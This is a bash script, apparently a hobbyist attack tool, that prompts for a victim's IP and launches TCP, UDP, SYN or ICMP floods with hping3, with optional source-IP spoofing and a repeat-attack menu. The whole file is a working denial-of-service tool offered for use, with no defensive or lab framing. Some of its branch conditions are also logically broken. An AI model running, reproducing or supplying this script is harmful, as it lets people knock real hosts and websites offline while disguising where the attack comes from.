#!/bin/bash 

#Checks if the user is in superuser.



function main() {

if [[ $(id -u) == 0 ]]; then
	
echo "Your in superuser! Script can proceed."


elif [[ $(id -u) != 0 ]]; then

echo "Your not in superuser! Script will exit."
exit

fi

#Ryuzaki watermark.

echo "██████╗ ██╗   ██╗██╗   ██╗███████╗ █████╗ ██╗  ██╗██╗" 
echo "██╔══██╗╚██╗ ██╔╝██║   ██║╚══███╔╝██╔══██╗██║ ██╔╝██║"
echo "██████╔╝ ╚████╔╝ ██║   ██║  ███╔╝ ███████║█████╔╝ ██║"
echo "██╔══██╗  ╚██╔╝  ██║   ██║ ███╔╝  ██╔══██║██╔═██╗ ██║"
echo "██║  ██║   ██║   ╚██████╔╝███████╗██║  ██║██║  ██╗██║"
echo "╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝"

menu

}

#Menu function

function menu() {

echo -e "\e[34mDo you already have the victims IP? (this can be an IP from a website or just the IP of a machine)"
echo "[1]  Yes"
echo -e "[2]  No\e[31m"

read haveIP

if [[ $haveIP == "1" ]]; then
	
:

elif [[ $haveIP == "2" ]]; then
	
python3 IPtracker.py

else

echo "Error invalid input"
exit

fi

echo -e "\e[34mWhich IP would u like to flood?(Launch a Denial of Service attack)?\e[0m"

read target

echo -e "\e[34mWhat kind of method would you like to use?\e[31m"
echo "[1]  TCP flood"
echo "[2]  UDP flood"
echo "[3]  SYN flood"
echo "[4]  ICMP flood"

read DoSmethod

if [[ $DoSmethod -gt 4 ]]; then 

echo -e "\e[32mError invalid input\e[0m"
exit

elif [[ $DoSmethod -lt 1 ]]; then
	
echo -e "\e[32mError invalid input\e[0m"
exit

fi

echo -e "\e[34mWhat kind of port would u like to use?\e[0m"

read port

echo -e "\e[34mWould u like to spoof ur IP while launching the attack?"
echo -e "\e[32m[y/n]\e[0m"

read IPspoof

if [[ $IPspoof == "y" ]] || [[ $IPspoof == "Y" ]] || [[ $IPspoof == "yes" ]] || [[ $IPspoof == "Yes" ]]; then
	
echo -e "\e[31mInsert the dummy IP you'd like to use! (This can be any IP)\e[0m"

read IP

elif [[ $IPspoof == "n" ]] || [[ $IPspoof == "N" ]] || [[ $IPspoof == "no" ]] || [[ $IPspoof == "No" ]]; then

:

else 

echo -e "\e[32mError invalid input\e[0m"
exit

fi


if [[ $DoSmethod == "1" ]] && [[ $IPspoof == "n" ]] || [[ $IPspoof == "no" ]] || [[ $IPspoof == "No" ]] || [[ $IPspoof == "N" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"	
hping3 --flood -p $port $target > /dev/null

exiting

elif [[ $DoSmethod == "1" ]] && [[ $IPspoof == "y" ]] || [[ $IPspoof == "Y" ]] || [[ $IPspoof == "Yes" ]] || [[ $IPspoof == "yes" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -a $IP -p $port $target > /dev/null
exiting

elif [[ $DoSmethod == "2" ]] && [[ $IPspoof == "n" ]] || [[ $IPspoof == "no" ]] || [[ $IPspoof == "No" ]] || [[ $IPspoof == "N" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"	
hping3 --flood -2 -p $port $target > /dev/null
exiting

elif [[ $DoSmethod == "2" ]] && [[ $IPspoof == "y" ]] || [[ $IPspoof == "Y" ]] || [[ $IPspoof == "Yes" ]] || [[ $IPspoof == "yes" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -2 -a $IP -p $port $target > /dev/null
exiting

elif [[ $DoSmethod == "3" ]] && [[ $IPspoof == "n" ]] || [[ $IPspoof == "no" ]] || [[ $IPspoof == "No" ]] || [[ $IPspoof == "N" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -S -p $port $target > /dev/null
exiting

elif [[ $DoSmethod == "3" ]] && [[ $IPspoof == "y" ]] || [[ $IPspoof == "Y" ]] || [[ $IPspoof == "Yes" ]] || [[ $IPspoof == "yes" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -S -a $IP -p $port $target > /dev/null
exiting

elif [[ $DoSmethod == "4" ]] && [[ $IPspoof == "n" ]] || [[ $IPspoof == "no" ]] || [[ $IPspoof == "No" ]] || [[ $IPspoof == "N" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -1 -p $port $target > /dev/null
exiting

elif [[ $DoSmethod == "4" ]] && [[ $IPspoof == "y" ]] || [[ $IPspoof == "Y" ]] || [[ $IPspoof == "Yes" ]] || [[ $IPspoof == "yes" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -1 -a $IP -p $port $target > /dev/null
exiting

fi 

#This function will be executed if the variable $menuchoice = 1


}


function exiting(){

echo -e "\e[31m[1]  Go back to the menu"
echo "[2]  Exit the script"
echo "[3]  Repeat attack"

read exitchoice

if [[ $exitchoice == "1" ]]; then

menu

elif [[ $exitchoice == "2" ]]; then

echo -e "\e[35mThanks for using my script!"
echo -e "See u soon :)\e[0m"
exit

elif [[ $exitchoice == "3" ]] && [[ $DoSmethod == "1" ]] && [[ $IPspoof == "n" ]] || [[ $IPspoof == "N" ]] || [[ $IPspoof == "No" ]] || [[ $IPspoof == "no" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"	
hping3 --flood -p $port $target > /dev/null
exiting

elif [[ $exitchoice == "3" ]] && [[ $DoSmethod == "1" ]] && [[ $IPspoof == "y" ]] || [[ $IPspoof == "Y" ]] || [[ $IPspoof == "Yes" ]] || [[ $IPspoof == "yes" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -a $IP -p $port $target > /dev/null
exiting

elif [[ $exitchoice == "3" ]] && [[ $DoSmethod == "2" ]] && [[ $IPspoof == "n" ]] || [[ $IPspoof == "no" ]] || [[ $IPspoof == "No" ]] || [[ $IPspoof == "N" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"	
hping3 --flood -2 -p $port $target > /dev/null
exiting

elif [[ $exitchoice == "3" ]] && [[ $DoSmethod == "2" ]] && [[ $IPspoof == "yes" ]] || [[ $IPspoof == "Yes" ]] || [[ $IPspoof == "Y" ]] || [[ $IPspoof == "y" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"	
hping3 --flood -a $IP -2 -p $port $target > /dev/null
exiting


elif [[ $exitchoice == "3" ]] && [[ $DoSmethod == "3" ]] && [[ $IPspoof == "n" ]] || [[ $IPspoof == "no" ]] || [[ $IPspoof == "No" ]] || [[ $IPspoof == "N" ]]; then
	
echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -S -p $port $target > /dev/null
exiting

elif [[ $exitchoice == "3" ]] && [[ $DoSmethod == "3" ]] && [[ $IPspoof == "y" ]] || [[ $IPspoof == "Y" ]] || [[ $IPspoof == "yes" ]] || [[ $IPspoof == "Yes" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -a $IP -S -p $port $target > /dev/null
exiting

elif [[ $exitchoice == "3" ]] && [[ $DoSmethod == "4" ]] && [[ $IPspoof == "No" ]] || [[ $IPspoof == "N" ]] || [[ $IPspoof == "no" ]] || [[ $IPspoof == "n" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -1 -p $port $target > /dev/null
exiting

elif [[ $exitchoice == "3" ]] && [[ $DoSmethod == "4" ]] && [[ $IPspoof == "No" ]] || [[ $IPspoof == "N" ]] || [[ $IPspoof == "no" ]] || [[ $IPspoof == "n" ]]; then

echo -e "\e[32mThere will be no DoS packet output!\e[0m"
hping3 --flood -1 -a $IP -p $port $target > /dev/null
exiting

fi

}
main